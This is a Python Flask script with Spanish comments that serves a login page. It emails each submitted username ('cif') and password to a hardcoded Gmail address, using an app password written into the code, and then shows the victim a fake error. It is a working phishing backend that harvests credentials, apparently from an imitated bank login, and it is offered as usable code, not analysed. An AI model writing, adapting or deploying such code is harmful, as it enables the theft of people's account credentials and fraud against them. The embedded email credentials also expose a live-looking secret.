from flask import Flask, render_template, request
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

@app.route('/')
def login_form():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    usuario = request.form['cif']
    contrasena = request.form['password']

    # Email a donde querés recibir los datos
    destino = 'nosananolife2808@gmail.com'

    # Preparar correo
    msg = EmailMessage()
    msg['Subject'] = 'Intento de ingreso'
    msg['From'] = destino
    msg['To'] = destino
    msg.set_content(f'Usuario: {usuario}\nContraseña: {contrasena}')

    # Enviar usando Gmail (requiere contraseña de aplicación)
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(destino, 'wxjc dfcr tdjh ajrt')  # <- no pongas tu contraseña normal
            smtp.send_message(msg)
        return "html 16011 error"
    except Exception as e:
        print("Error al enviar:", e)
        return "Error al enviar"

if __name__ == '__main__':
    app.run(debug=True)